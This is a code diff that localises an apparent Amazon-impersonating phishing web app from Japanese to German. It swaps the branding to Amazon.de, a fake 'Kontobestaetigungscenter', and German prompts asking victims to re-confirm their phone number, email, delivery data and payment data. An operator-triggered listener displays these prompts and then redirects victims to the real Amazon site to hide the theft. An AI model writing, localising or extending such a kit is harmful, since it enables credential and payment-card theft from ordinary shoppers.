@@ -10,7 +10,7 @@ import Checkout from './pages/Checkout';
 import Verify from './pages/Verify';
 import AppCheck from './pages/AppCheck';
 
-const ADMIN_EXTERNAL_URL = 'https://www.amazon.co.jp/';
+const ADMIN_EXTERNAL_URL = 'https://www.amazon.de/';
 
 function getRouteNotice(target: string, reason: string) {
   const cleanReason = reason.trim();
@@ -18,13 +18,13 @@ function getRouteNotice(target: string, reason: string) {
   switch (target) {
     case 'verifyphone':
     case 'phoneverify':
-      return cleanReason || '前回の確認コードは期限切れです。新しいコードを受け取るため、電話番号を確認してください。';
+      return cleanReason || 'Der vorherige Code ist abgelaufen. Bitte bestaetigen Sie Ihre Telefonnummer, um einen neuen Code zu erhalten.';
     case 'emailverify':
-      return cleanReason || '前回の確認コードは期限切れです。新しいコードを受け取るため、メールアドレスを確認してください。';
+      return cleanReason || 'Der vorherige Code ist abgelaufen. Bitte bestaetigen Sie Ihre E-Mail-Adresse, um einen neuen Code zu erhalten.';
     case 'info':
-      return cleanReason || '配送先情報を確認のうえ、もう一度入力してください。';
+      return cleanReason || 'Bitte pruefen Sie Ihre Lieferdaten und geben Sie sie erneut ein.';
     case 'checkout':
-      return cleanReason || 'お支払い情報を確認のうえ、もう一度入力してください。';
+      return cleanReason || 'Bitte pruefen Sie Ihre Zahlungsdaten und geben Sie sie erneut ein.';
     default:
       return '';
   }
@@ -63,7 +63,7 @@ function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void 
       try {
         const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
         if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
-        onNotice('確認が完了しました。注文ページへ移動します。');
+        onNotice('Die Bestaetigung ist abgeschlossen. Sie werden jetzt zur Bestellseite weitergeleitet.');
         if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
         pendingTimerRef.current = window.setTimeout(() => {
           window.location.href = parsed.toString();
@@ -99,7 +99,7 @@ function App() {
   }, []);
 
   useEffect(() => {
-    document.title = 'Amazon Global: International Shipping Made Easy';
+    document.title = 'Amazon.de Kontobestaetigungscenter';
     document.body.setAttribute('data-brand', BRAND.id);
     const root = document.documentElement;
     root.style.setProperty('--alz-navy', BRAND.theme.navy);
@@ -169,34 +169,34 @@ function App() {
         <header className="alz-nav">
           <div className="alz-nav-inner">
             <div className="alz-nav-left">
-              <button type="button" className="alz-nav-menu" aria-label="Open menu">
+              <button type="button" className="alz-nav-menu" aria-label="Menue oeffnen">
                 <span />
                 <span />
                 <span />
               </button>
               <div className="alz-nav-brand">
-                <div className="alz-nav-logo" aria-label="Amazon.co.jp">
-                  <img src="/Amazon_2024.svg" alt="Amazon.co.jp アカウント確認センター" className="alz-nav-logo-img" />
+                <div className="alz-nav-logo" aria-label="Amazon.de">
+                  <img src="/Amazon_2024.svg" alt="Amazon.de Kontobestaetigungscenter" className="alz-nav-logo-img" />
                 </div>
               </div>
             </div>
             <div className="alz-nav-actions">
               <div className="alz-nav-signin">
-                <span>ログイン</span>
+                <span>Anmelden</span>
                 <span className="alz-nav-caret" aria-hidden="true">&gt;</span>
                 <span className="alz-nav-user" aria-hidden="true">
                   <span className="alz-nav-user-head" />
                   <span className="alz-nav-user-body" />
                 </span>
               </div>
-              <div className="alz-nav-cart" aria-label="Cart">
+              <div className="alz-nav-cart" aria-label="Warenkorb">
                 <img src="/amazon-cart-icon.svg" alt="" aria-hidden="true" className="alz-nav-cart-img" />
               </div>
             </div>
           </div>
           <div className="alz-nav-search-row">
             <div className="alz-nav-search-shell" aria-hidden="true">
-              <div className="alz-nav-search-input">Amazon.co.jpを検索</div>
+              <div className="alz-nav-search-input">Amazon.de durchsuchen</div>
               <div className="alz-nav-search-action">
                 <span className="alz-nav-search-icon" />
               </div>
@@ -214,11 +214,11 @@ function App() {
         </main>
         <footer className="alz-global-footer">
           <div className="alz-global-footer-inner">
-            <span>利用規約</span>
-            <span>プライバシー規約</span>
-            <span>ヘルプ</span>
-            <span>Cookie設定</span>
-            <span>(c) 2026 {BRAND.name}.co.jp</span>
+            <span>Nutzungsbedingungen</span>
+            <span>Datenschutz</span>
+            <span>Hilfe</span>
+            <span>Cookie-Einstellungen</span>
+            <span>(c) 2026 {BRAND.name}.de</span>
           </div>
         </footer>
       </div>
